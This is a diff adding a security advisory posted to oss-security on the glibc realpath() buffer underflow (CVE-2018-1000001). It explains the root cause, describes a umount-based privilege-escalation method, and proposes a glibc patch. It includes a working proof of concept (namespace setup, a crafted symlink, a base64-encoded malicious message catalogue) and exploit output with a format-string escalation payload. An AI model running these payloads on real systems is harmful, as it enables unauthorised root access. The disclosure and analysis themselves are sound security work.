@@ -1,0 +1,475 @@
+
+Date: Thu, 11 Jan 2018 21:34:44 +0000
+From: halfdog <me@...fdog.net>
+To: oss-security@...ts.openwall.com
+Subject: Libc Realpath Buffer Underflow CVE-2018-1000001
+
+Hello list,
+
+This issue is already overdue. Here is a copy of [0] for the archives.
+
+hd 
+
+[0] https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
+
+
+
+<-- Created by SecurityReportToText.xsl V20171225 -->
+
+Libc Realpath Buffer Underflow
+==============================
+
+=== Introduction ===
+
+The vulnerability described here is caused by Linux kernel
+behaviour change in the syscall API (returning relative pathnames
+in getcwd()) and non-defensive function implementation in libc
+(failing to process that pathname correctly). Other libraries
+are very likely to be affected as well. On affected systems this
+vulnerability can be used to gain root privileges via SUID binaries.
+
+The return value specification change in getcwd() was introduced
+in Linux kernel Linux 2.6.36. It has already caused troubles,
+even in realpath(), but at different location (see "bug report" [idm22])
+and was not identified as security issue.
+
+= Linux kernel side: =: One of the weaknesses of Linux kernel is,
+that it is not fully POSIX compliant (see "Wikipedia POSIX" [idm25]). To
+allow programmers to produce clean and secure code, meticulous
+documentation would be needed, especially to write cross-platform
+software. Changes in specification and documentation after software
+was already written always pose an extra risk. This is also true
+for commit "vfs: show unreachable paths in getcwd and proc" [idm26]
+changing the behaviour of getcwd(). The new specification made
+it finally to the manpages (see "getcwd(2)" [idm27]), but at that
+time glibc was already written. From the somehow contradictory man page:
+
+/These functions return a null-terminated string containing
+an _absolute_ pathname that is the current working directory of
+the calling process. The pathname is returned as the function
+result and via the argument buf, if present./
+
+/If the current directory is not below the root directory of
+the current process (e.g., because the process set a new filesystem
+root using chroot(2) without changing its current directory into
+the new root), then, since Linux 2.6.36, the returned path will
+be prefixed with the string "(unreachable)". Such behavior can
+also be caused by an unprivileged user by changing the current
+directory into another mount namespace. When dealing with paths
+from untrusted sources, callers of these functions should consider
+checking whether the returned path starts with '/' or '(' to avoid
+misinterpreting an unreachable path as a relative path..../
+
+/...getcwd() conforms to POSIX.1-2001. Note however that
+POSIX.1-2001 leaves the behavior of getcwd() unspecified if buf
+is NULL./
+
+The documentation is accurate regarding use of /(unreachable)/
+but most likely not according POSIX compliance. At least POSIX 2004
+and 2008 are violated, 2001 version of standard seems not available
+for free. According to "IEEE Std 1003.1-2008" [idm36] specification of
+getcwd():
+
+/The getcwd() function shall place an absolute pathname of the
+current working directory in the array pointed to by buf, and
+return buf. The pathname shall contain no components that are
+dot or dot-dot, or are symbolic links./
+
+As it seems, that consequences from the change of interface
+specification on Linux kernel side only were not recognized
+by all affected parties. The realpath() function, which relies
+on using getcwd() to resolve relative path names still required
+the old behaviour. Also the manpage does not reflect the changes
+in underlying getcwd() call, see "realpath(3)" [idm40].
+
+= Libc side: =: glibc still assumes that kernel getcwd()
+would return absolute pathnames and relies on that behaviour when
+realpath() attempts to create a canonicalized absolute pathname:
+/realpath() expands all symbolic links and resolves references
+to /./, /../ and extra '/' characters in the null-terminated string
+named by path to produce a canonicalized absolute pathname.../
+When resolving a relative symbolic link, e.g. /../../x/,
+realpath() will use the current working directory, assuming it
+will start with a /. The function starts at the end of the getcwd
+pathname to jump forward from slash to slash for each /..//
+found in the symbolic link to resolve. It does not check the boundaries
+of the buffer, thus may end up at a slash before the string buffer
+used to create the canonicalized absolute pathname. So resolving
+the link named above with getcwd() returning /(unreachable)//,
+the second /..// will have moved the pointer before the buffer,
+the next part /x/ is then copied to this memory location.
+As realpath usually operates on heap buffers.
+
+
+=== Methods ===
+
+This section describes how to improve a simple demonstrator
+to a complex, ASLR-aware high-reliable exploit. The steps used
+might not be the most elegant way to do so. Any hints for improvement
+are appreciated.
+
+To exploit the underflow for privilege escalation, the /mount,
+unmount/ SUID binaries are most suitable targets: they process
+pathes using realpath(), do not drop privileges and can be invoked
+by any user. /umount/ was selected as candidate as it allows
+to process more than one mountpoint per run, thus traversing the
+problematic code more than once. This seemed to be the best way
+to allow user controlled gradual memory editing, defeat of ASLR
+measures and finally quite reliable code execution.
+
+As /umount/ realpath() operates on heap, the first step
+was to create a reproducible heap layout. This was done be removing
+all interfering environment variables and just working with those
+related to locale support. As locales are initialized before umount
+option parsing, this editing affectes the heap structure and content
+lower addresses than the buffer used in the fatal realpath() call.
+Therefore the current exploit relies on the availability of a
+single locale, but /libc-bin/ on standard systems provides
+one: //usr/lib/locale/C.UTF-8/.  It is loaded by using the
+environment variable /LC_ALL=C.UTF-8/.
+
+After locale setup, the realpath buffer underflow will overwrite
+a slash in a locale string, used for loading of national language
+support (NLS) files, thus changing it to a relative pathname.
+Thus user controlled translations of umount error messages are
+loaded, giving write access to some memory adresses using the
+%n format feature of /fprintf/ to modify memory. As the stack
+layout used by fprintf is fixed, any address references will work
+without considering ASLR. Luckily, one of those references points
+to the /struct libmnt_context/ defined in /libmount/src/mountP.h/
+from util-linux:
+
+************************************************************
+struct libmnt_context
+{
+        int     action;         /* MNT_ACT_{MOUNT,UMOUNT} */
+        int     restricted;     /* root or not? */
+
+        char    *fstype_pattern;        /* for mnt_match_fstype() */
+        char    *optstr_pattern;        /* for mnt_match_options() */
+...
+************************************************************
+
+
+As the /restricted/ field is within reach, overwriting
+it will make umount believe, that it was started by root, even
+when it was not. This can be used for a quite simple DoS by unmounting
+the root filesystem, which will cause very funny side effects
+on running programs, e.g. aborts, SEGV, .... Follwing commands
+demonstrate the behaviour on fully patched Debian Stretch amd64
+with libc6 2.24-11+deb9u1 and umount from package mount 2.29.2-1.
+Keep in mind, that this simplified POC operates on the umount
+process memory, thus will need adoption to other software versions:
+
+************************************************************
+# Enable USERNS clone as root for demonstration:
+root$ echo 1 > /proc/sys/kernel/unprivileged_userns_clone
+# As normal user create a new namespace:
+test$ /usr/bin/unshare -m -U --map-root-user /bin/sh
+# Caveat: following steps are performed as USERNS-root, not real
+# root user.
+root$ mount -t tmpfs tmpfs /tmp
+root$ cd /tmp
+root$ chmod 00755 .
+root$ mkdir -p -- "(unreachable)/tmp" "(unreachable)/tmp/from_archive/C/LC_MESSAGES" "(unreachable)/x"
+root$ ln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A "(unreachable)/tmp/down"
+# Make mount unrestricted by overwriting struct libmnt_context, thus
+# affecting mnt_context_is_restricted in "libmount/src/context.c".
+root$ base64 -d <<B64-EOF | bzip2 -cd > "(unreachable)/tmp/from_archive/C/LC_MESSAGES/util-linux.mo"
+QlpoOTFBWSZTWTOfm9IAAGX/pn6UlARGB+FeKyZnAD/n3mACAAAgAAEgAJSIqfkpspk0eUGJ6gAG
+mQeoaD1PJAamlPJGCNMTIaNGmnqMQ0AAzSwpEWpQICVUw+490ohZBgZ+s4EBAZCn/TavSQshtCiv
+iG6HOehyAp4FPt3zkpdTxNchTYITLBkXUjsgpN2QDBNX8qmbpkVgfLXKcQc1ZhVF0FxUQOtnbGlL
+5NhRmORwmQF1Dw3Yu1mds6tGAmnLwWwc2KRKGl5hcLuSKcKEgZz83pA=
+B64-EOF
+root$ echo "$$"
+2299
+# Now continue in another shell using the USERNS pid from before:
+test$ /proc/2299/cwd
+test$ LC_ALL=C.UTF-8 /bin/umount --lazy down /
+umount: AAlnAAAAAAAAAAA
+************************************************************
+
+The simplified single-stage POC from above has multiple drawbacks:
+it can only reliable toggle the permissions bit, thus allowing
+unmounting / causing DoS, but not arbitrary code execution. For
+that, ASLR has to be defeated first. This can be done by following
+sequence of events:
+
+* Start umount with large number of environment variables that
+containing "AANGUAGE=X.X", that are just one letter off from correct
+language settings. The large number of environment variables "sprays"
+the upper stack area with a long list of valid pointers.
+* Let umount call realpath() and underflow. When the error message
+is printed, a first-stage message catalogue file is loaded and
+the format string dumps the whole stack to stderr, remove the
+"restricted" bit similar to simplified POC and write a 'L' to
+the sprayed stack, modifying one entry to "LANGUAGE=X.X".
+
+* Due to change of language, umount will attemt to load another
+language catalogue. As the exploit prepared a pipe with that name,
+umount will block here giving the exploit the chance to synchronize,
+create an updated message catalogue and let umount continue.
+
+* The updated format strings now contain all offsets for the
+currently running binary. But the stack does not contain suitable
+pointers for writing and fprintf ignores changes of argument pointers
+while running because secure printf copies the values down the
+stack, where we cannot use them directly. Hence fprintf must be
+invoked more than once with the same (unmodified) format string,
+but still has to behave different on each invocation to overwrite
+different memory locations. This is done using the format string
+itself for arithmetics, each fprintf invocation as clock and the
+length of path-name input as instruction pointer, thus creating
+a simplified virtual machine.
+
+* The repeated format string processing changes the return pointer
+from main function to two other functions: getdate() and execl().
+Those functions were choosen for ROP because a single call to
+system() would not work on Ubuntu. This is due to /bin/sh having
+a patch missing in Debian, that will reset the effective UID when
+not matching the the current UID. But as exec calls require a
+more complex stack/register configuration, let getdate() do the
+work for us. For escalation using umount, calling execve in the
+end should work also on SELinux/AppArmor hardened systems. Umount
+needs to call file system helpers during normal operation also.
+On other systems, execl() could be replaced by dlopen(), to inject
+code into running process.
+
+* The invoked program file contains a shebang to make the operating
+system invoke the exploit program as interpreter. The exploit
+then changes his own file ownership and mode to become a root
+SUID binary and terminates. Starting the shell here immediately
+would be possible, but the mount process has a strange set of
+environment variables, which is not so convenient for further
+shell use. Apart from that, by terminating the caller can detect
+successful escalation, perform all cleanup.
+
+* When the initial caller of mount notices the mode change of
+the file, it performs the cleanup and invokes the SUID binary
+to use its secondary function - a SUID shell, thus completing
+the escalation.
+
+All those steps are currently implemented in "RationalLove.c" [idm81]
+apart for the code to create the namespace. Therefore the pid
+of a suitable namespace process has to be hardcoded before compiling.
+Here is the output of exploit invocation:
+
+************************************************************
+
+test@...t$ ./RationalLove
+./RationalLove: setting up environment ...
+./RationalLove: using umount at "/bin/umount".
+Attempting to gain root, try 1 of 10 ...
+Starting subprocess
+Stack content received, calculating next phase
+Found source address location 0x7fffb6505d18 pointing to target address 0x7fffb6505de8 with value 0x7fffb650723f, libc offset is 0x7fffb6505d08
+Changing return address from 0x7f9617db62b1 to 0x7f9617e41c30, 0x7f9617e4e900
+Using escalation string %67$hn%71$hn%1$6116.6116s%65$hn%69$hn%1$1100.1100s%64$hn%1$25446.25446s%66$hn%70$hn%1$26986.26986s%68$hn%1$5888.5888s%1$23798.23798s%1$s%1$s%63$hn%1$s%1$s%1$s%1$s%1$s%1$s%1$186.186s%37$hn-%35$lx-%37$lx-%62$lx-%63$lx-%64$lx-%65$lx-%66$lx-%67$lx-%68$lx-%69$lx-%78$s
+Executable now root-owned
+Cleanup completed, re-invoking binary
+/proc/self/exe: invoked as SUID, invoking shell ...
+root@...t# id
+uid=0(root) gid=0(root) groups=0(root),100(users)
+************************************************************
+
+ASLR could also be circumvented using a but in mount environment
+variable handling, see "util-linux mount/unmount ASLR bypass
+via environment variable" [idm84].
+
+
+=== Results, Discussion ===
+
+As for example, misbehaviour can be triggered when performing
+a /getcwd/ call in a directory not visible in the current
+mount namespace of the process. See "mount_namespaces man page" [idm89]
+for more information. Therefore a process has to reach such a
+directory within another namespace. There should be various ways
+to do that, e.g. using the /proc/ filesystem to enter the
+working directory of another process (method used in exploit),
+by passing file descriptors via /SCM_RIGHTS/ between cooperating
+processes in different namespaces. Therefore this vulnerability
+shows again the importance of system hardening by disabling USERNS
+when not needed.
+
+On a system with unprivileged USERNS enabled, an attacker can
+create all required namespaces. On other systems, it might be
+possible to use namespaces created by other processes using the
+/proc/ access approach. These can be discovered using
+/readlink /proc/*/ns/mnt | sort -u/. While /systemd-udevd/
+just uses a namespace in a way required for exploitation, the
+//proc/[pid]/cwd/ link cannot accessed by unprivileged users.
+
+Still /systemd-udevd/ is a good example, how hardening of
+a single application by namespaces might also create additional
+attack surface, not only in the application itself. Hence the
+attack method described here may also be appropriate to attack
+other applications using the same hardening measures, e.g. lxc
+or docker.
+
+= Affected systems: =: Platforms where _Linux kernel_ getcwd()
+prepends non-path components, e.g. to indicate unreachable
+pathes. Such code can be found in /fs/dcache.c/:
+
+************************************************************
+static int prepend_unreachable(char **buffer, int *buflen)
+{
+        return prepend(buffer, buflen, "(unreachable)", 13);
+}
+************************************************************
+
+Most likely this code was created in analogy to the /(deleted)/
+suffix to indicate file handles to deleted files, e.g.:
+
+************************************************************
+test$ touch /tmp/x
+test$ exec 3</tmp/x
+test$ rm /tmp/x
+test$ readlink /proc/self/fd/3
+/tmp/x (deleted)
+************************************************************
+
+_Userspace:_ Currently only libc is proven to misbehave
+when Linux getcwd() returns a relative path. But other libraries
+or tools might also fail in unexpected ways due to that bug.
+
+_glibc:_ Here the underflow occurs in /__realpath/ from
+/stdlib/canonicalize.c/:
+
+************************************************************
+     42 char *
+     43 __realpath (const char *name, char *resolved)
+     44 {
+...
+# When resolving a relative pathname, getcwd() is called:
+     86   if (name[0] != '/')
+     87     {
+     88       if (!__getcwd (rpath, path_max))
+     89         {
+     90           rpath[0] = '\0';
+     91           goto error;
+     92         }
+     93       dest = __rawmemchr (rpath, '\0');
+     94     }
+     95   else
+...
+# Loop over all name components:
+    101   for (start = end = name; *start; start = end)
+    102     {
+...
+# If the name component is "..", remove it. This underflows the
+# buffer if rpath does not contain a starting slash.
+    118       else if (end - start == 2 && start[0] == '.' && start[1] == '.')
+    119         {
+    120           /* Back up to previous component, ignore if at root already.          */
+    121           if (dest > rpath + 1)
+    122             while ((--dest)[-1] != '/');
+    123         }
+    124       else
+# The name component is not ".", "..", so copy the name to dest.
+    125         {
+    126           size_t new_size;
+    127
+    128           if (dest[-1] != '/')
+    129             *dest++ = '/';
+...
+************************************************************
+
+
+Therefore a simple patch could be "glibc-fail-on-unreachable-v1.patch" [idm114] (nearly UNTESTED,
+older version "v0" [idm115]):
+
+************************************************************
+--- stdlib/canonicalize.c	2018-01-05 07:28:38.000000000 +0000
++++ stdlib/canonicalize.c	2018-01-05 14:06:22.000000000 +0000
+@@ -91,6 +91,11 @@
+ 	  goto error;
+ 	}
+       dest = __rawmemchr (rpath, '\0');
++/* If path is empty, kernel failed in some ugly way. Realpath
++has no error code for that, so die here. Otherwise search later
++on would cause an underrun when getcwd() returns an empty string.
++Thanks Willy Tarreau for pointing that out. */
++      assert (dest != rpath);
+     }
+   else
+     {
+@@ -118,8 +123,17 @@
+       else if (end - start == 2 && start[0] == '.' && start[1] == '.')
+ 	{
+ 	  /* Back up to previous component, ignore if at root already.  */
+-	  if (dest > rpath + 1)
+-	    while ((--dest)[-1] != '/');
++	  dest--;
++	  while ((dest != rpath) && (*--dest != '/'));
++	  if ((dest == rpath) && (*dest != '/') {
++	    /* Return EACCES to stay compliant to current documentation:
++	    "Read or search permission was denied for a component of the
++	    path prefix." Unreachable root directories should not be
++	    accessed, see https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/ */
++	    __set_errno (EACCES);
++	    goto error;
++	  }
++	  dest++;
+ 	}
+       else
+ 	{
+************************************************************
+
+= Outlook: =: It might be worth analyzing how ftp server
+implementation, webservers will react in such context. In some
+cases, this may require combination with application specific
+bugs or unexpected behaviour, e.g. "ApacheNoFollowSymlinkTimerace" [idm119].
+
+
+=== Timeline ===
+
+* 20171231: Reported to distros list as glibc errors should
+be reported to distros first.
+* 20180101: Info distros: kernel issue should be handled first.
+Reported to kernel security.
+* 20180102: Kernel security reply: getcwd() behaviour documented
+in "getcwd() 3" man pages, not an issue. Only libraries need fixing.
+* 20180107: Final high-reliability anti-ASLR exploit for Stretch/Xenial using getdate/execl
+* 20180110: CVE "CVE-2018-1000001" [idm128] assigned.
+* 20180111: Publication without exploit code.
+
+
+=== Material, References ===
+
+
+
+* Linux POSIX compliance: "Wikipedia" [idm134]
+* POSIX IEEE Std 1003.1-2008: "getcwd" [idm136]
+* Linux mount namespaces: "man page" [idm138]
+* Commit effecting getcwd() in Linux kernel: "vfs: show unreachable paths in getcwd and proc" [idm140]
+* realpath() with namespaces lstat issue: "18203" [idm142]
+* mount/umount small anti-ASLR bug: "util-linux mount/unmount ASLR bypass via environment variable" [idm144]
+* Redhat bug report: "1530306" [idm146]
+* SUSE bug report: "1074293" [idm148]
+
+>>> Last modified 20180111
+Contact e-mail: me (%) halfdog.net <<<
+
+* [idm22] https://sourceware.org/bugzilla/show_bug.cgi?id=18203
+* [idm25] https://en.wikipedia.org/wiki/POSIX#Mostly_POSIX-compliant
+* [idm26] https://github.com/torvalds/linux/commit/8df9d1a4142311c084ffeeacb67cd34d190eff74
+* [idm27] http://man7.org/linux/man-pages/man2/getcwd.2.html
+* [idm36] http://pubs.opengroup.org/onlinepubs/9699919799/functions/getcwd.html
+* [idm40] http://man7.org/linux/man-pages/man3/realpath.3.html
+* [idm81] https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
+* [idm84] https://www.spinics.net/lists/util-linux-ng/msg14978.html
+* [idm89] http://man7.org/linux/man-pages/man7/mount_namespaces.7.html
+* [idm114] https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/glibc-fail-on-unreachable-v1.patch
+* [idm115] https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/glibc-fail-on-unreachable-v0.patch
+* [idm119] https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/../../2011/ApacheNoFollowSymlinkTimerace/
+* [idm128] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000001
+* [idm134] https://en.wikipedia.org/wiki/POSIX#Mostly_POSIX-compliant
+* [idm136] http://pubs.opengroup.org/onlinepubs/9699919799/functions/getcwd.html
+* [idm138] http://man7.org/linux/man-pages/man7/mount_namespaces.7.html
+* [idm140] https://github.com/torvalds/linux/commit/8df9d1a4142311c084ffeeacb67cd34d190eff74
+* [idm142] https://sourceware.org/bugzilla/show_bug.cgi?id=18203
+* [idm144] https://www.spinics.net/lists/util-linux-ng/msg14978.html
+* [idm146] https://bugzilla.redhat.com/show_bug.cgi?id=1530306
+* [idm148] https://bugzilla.suse.com/show_bug.cgi?id=1074293
+
+
